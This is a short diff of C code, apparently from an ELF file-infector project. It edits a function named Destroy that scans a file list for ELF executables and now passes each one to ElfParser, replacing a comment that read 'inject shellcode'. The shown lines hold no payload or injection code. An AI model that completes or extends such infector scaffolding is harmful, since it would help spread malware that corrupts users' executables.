@@ -22,6 +22,7 @@
 unsigned long int elf_count = 0; 
 
 
+
 // Parses the FileList, checking the filetypes and perform actions accordingly  
 void Destroy(FileList *start)
 {
@@ -36,8 +37,8 @@ void Destroy(FileList *start)
 		if ( IsELF(ptr->name) )
 		{
 			++elf_count;
-			fprintf(stdout, GREEN"[%ld] ELF"RESET" : %s\n", elf_count, ptr->name);
-			// inject shellcode
+			// [DEBUG] fprintf(stdout, GREEN"[%ld] ELF"RESET" : %s\n", elf_count, ptr->name);
+			ElfParser(ptr->name);
 		}
 		
 		else
@@ -50,6 +51,7 @@ void Destroy(FileList *start)
 
 	} while (ptr != NULL);
 }
+
 
 
 int log_heading_set = 0;
@@ -95,7 +97,7 @@ static int IsELF(char *file)
 	}
 
 
-	//fprintf(stdout, CYAN"[+] "RESET" Bytes read : %x%x%x%x : %d !\n", magic[0], magic[1], magic[2], magic[3], bytes_read);
+	// MAGIC_ELF defined in <operations.h>
 	if (strncmp(magic, MAGIC_ELF, 4) != 0)
 	{
 		close(fd);
